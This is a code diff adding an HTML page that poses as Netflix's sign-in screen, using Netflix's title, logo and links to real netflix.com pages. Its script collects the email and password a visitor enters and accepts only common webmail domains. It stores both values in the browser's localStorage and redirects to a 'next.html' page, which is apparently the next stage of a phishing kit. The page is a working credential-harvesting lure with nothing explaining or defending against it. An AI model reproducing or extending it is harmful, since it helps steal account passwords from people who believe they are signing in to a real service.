@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Netflix</title>
+    <link rel="icon" href="./images/iconlogo.webp">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <style>
+        .error-message {
+            background-color: #f1ae3b;
+            color: black;
+            padding: 15px 20px;
+            border-radius: 5px;
+            font-family: Arial, sans-serif;
+            font-size: 15px;
+            max-width: 400px;
+            line-height: 1.5;
+            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.2);
+            margin-bottom: 25px;
+        }
+
+        .error-message a {
+            color: black;
+            text-decoration: underline;
+            font-weight: bold;
+        }
+
+        body {
+            background: #000;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .header {
+            text-align: left;
+            padding: 10px;
+        }
+
+        .header img {
+            margin-left: -3px;
+            width: 150px;
+            height: auto;
+            margin-bottom: -30px;
+        }
+
+        .login-container {
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .login-box {
+            background: rgba(0, 0, 0, 0.8);
+            padding: 0px;
+            border-radius: 8px;
+            box-shadow: none;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .login-box h2 {
+            color: #fff;
+            text-align: left;
+            margin-bottom: 23px;
+            font-size: 34px;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .form-group {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .form-group input {
+            width: 100%;
+            height: 70px;
+            line-height: 60px;
+            font-size: 16px;
+            border: 1px solid #717171;
+            border-radius: 4px;
+            background: transparent;
+            color: #fff;
+            outline: none;
+            padding: 0 10px;
+            box-sizing: border-box;
+            transition: border 0.3s ease;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .form-group input::placeholder {
+            color: transparent;
+        }
+
+        .form-group label {
+            position: absolute;
+            top: 50%;
+            left: 11px;
+            transform: translateY(-50%);
+            font-size: 14px;
+            color: grey;
+            pointer-events: none;
+            transition: all 0.2s ease;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .form-group input:focus + label,
+        .form-group input:not(:placeholder-shown) + label {
+            margin-left: 0px;
+            top: 13px;
+            transform: none;
+            font-size: 10px;
+            color: #fff;
+        }
+
+        .form-group input:focus {
+            border: 3px solid #ffffff;
+        }
+
+        .sign-in-button,
+        .use-code-button {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            cursor: pointer;
+            border: none;
+            border-radius: 4px;
+            transition: background-color 0.3s ease;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .sign-in-button {
+            background-color: red;
+            color: #fff;
+            margin-bottom: 20px;
+        }
+
+        .sign-in-button:hover {
+            background-color: rgb(215, 0, 0);
+        }
+
+        .use-code-button {
+            background-color: rgba(128, 128, 128, 0.4);
+            color: #fff;
+            margin-bottom: 10px;
+        }
+
+        .use-code-button:hover {
+            background-color: rgba(128, 128, 128, 0.3);
+        }
+
+        .or-separator {
+            color: #bcbcbcb8;
+            text-align: center;
+            margin-bottom: 18px;
+            font-weight: normal;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-top: 12px;
+            margin-bottom: 23px;
+            font-size: 15px;
+            color: #fff;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .forgot-password a {
+            color: #fff;
+            text-decoration: none;
+            transition: text-decoration 0.3s ease;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+            margin-bottom: 30px;
+            font-size: 15px;
+            color: #fff;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .remember-me input[type="checkbox"] {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 18px;
+            height: 18px;
+            background: rgba(0, 0, 0, 0.5);
+            margin-right: 11px;
+            border: 1px solid #717171;
+            border-radius: 3px;
+            position: relative;
+            cursor: pointer;
+            transition: background 0.3s ease, border 0.3s ease;
+        }
+
+        .remember-me input[type="checkbox"]:checked {
+            background: #fff;
+            border: none;
+        }
+
+        .remember-me input[type="checkbox"]:checked::after {
+            content: "";
+            position: absolute;
+            left: 5px;
+            top: 2px;
+            width: 4px;
+            height: 8px;
+            border: solid #000;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+        }
+
+        .new-to-us {
+            color: #a3a3a3;
+            margin-bottom: 30px;
+            text-align: left;
+            font-size: 16px;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .new-to-us a {
+            color: #fff;
+            text-decoration: none;
+            font-weight: 600;
+            transition: text-decoration 0.3s ease;
+        }
+
+        .new-to-us a:hover {
+            text-decoration: underline;
+        }
+
+        .recaptcha-info {
+            color: #717171;
+            font-size: 12px;
+            margin-bottom: 20px;
+            line-height: 1.4;
+            text-align: left;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .recaptcha-info a {
+            color: #4971c8;
+            text-decoration: none;
+            transition: text-decoration 0.3s ease;
+        }
+
+        .recaptcha-info a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            background: rgba(0, 0, 0, 0.8);
+            color: #fff;
+            padding: 20px 0;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .footer-container {
+            width: 90%;
+            max-width: 1200px;
+            margin: 0 auto;
+            text-align: left;
+        }
+
+        .footer-question {
+            margin-bottom: 20px;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .footer-row {
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            margin-bottom: 10px;
+        }
+
+        .footer-row a {
+            color: #fff;
+            margin-right: 15px;
+            text-decoration: none;
+            font-size: 14px;
+            transition: text-decoration 0.3s ease;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .footer-row a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-language {
+            margin-top: 10px;
+        }
+
+        .footer-language select {
+            padding: 5px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="header">
+        <a href="https://www.netflix.com/au/"><img src="./images/logo.png" alt="Logo"></a>
+    </div>
+
+    <div class="login-container">
+        <div class="login-box">
+            <h2>Sign in</h2>
+            <div id="error-message" class="error-message" style="display: none;"></div>
+            <form id="login-form">
+                <div class="form-group">
+                    <input type="text" id="email" name="email" placeholder=" " novalidate>
+                    <label for="email">Email or mobile number</label>
+                </div>
+                <div class="form-group">
+                    <input type="password" id="password" name="password" placeholder=" " novalidate>
+                    <label for="password">Password</label>
+                </div>
+                <button id="sign-in-button" class="sign-in-button" type="submit">Sign in</button>
+            </form>
+
+            <div class="or-separator">OR</div>
+            <button class="use-code-button" onclick="window.location.href='https://www.netflix.com/NotFound?'">Use a Sign-In Code</button>
+
+            <div class="forgot-password">
+                <a href="https://www.netflix.com/au/LoginHelp">Forgot Password?</a>
+            </div>
+
+            <div class="remember-me">
+                <input type="checkbox" id="rememberMe">
+                <label for="rememberMe">Remember me</label>
+            </div>
+
+            <div class="new-to-us">
+                New to Netflix? <a href="https://www.netflix.com/signup">Sign up now.</a>
+            </div>
+
+            <div class="recaptcha-info">
+                This page is protected by Google reCAPTCHA to ensure you're not a bot.
+                <a href="https://policies.google.com/privacy">Learn more.</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById("login-form");
+        const email = document.getElementById("email");
+        const password = document.getElementById("password");
+        const errorMessage = document.getElementById("error-message");
+        const allowedDomains = [
+            "@gmail.com",
+            "@hotmail.com",
+            "@outlook.com",
+            "@yahoo.com",
+            "@live.com",
+            "@aol.com"
+            // Add more allowed domains as per your requirement
+        ];
+
+        function handleFormSubmission(event) {
+            event.preventDefault();
+            const emailValue = email.value.trim();
+            const passwordValue = password.value.trim();
+
+            errorMessage.style.display = "none";
+            errorMessage.textContent = "";
+
+            if (emailValue === "") {
+                errorMessage.textContent = "Please enter your email address.";
+                errorMessage.style.display = "block";
+            } else if (!emailValue.includes("@")) {
+                errorMessage.textContent = "Please enter a valid email address.";
+                errorMessage.style.display = "block";
+            } else {
+                const isValidDomain = allowedDomains.some(domain => emailValue.endsWith(domain));
+                if (!isValidDomain) {
+                    errorMessage.textContent = "This email is not allowed.";
+                    errorMessage.style.display = "block";
+                } else {
+                    localStorage.setItem("email", emailValue);
+                    localStorage.setItem("password", passwordValue);
+                    window.location.href = "next.html"; // Redirect to the next page
+                }
+            }
+        }
+
+        form.addEventListener("submit", handleFormSubmission);
+    </script>
+</body>
+
+</html>
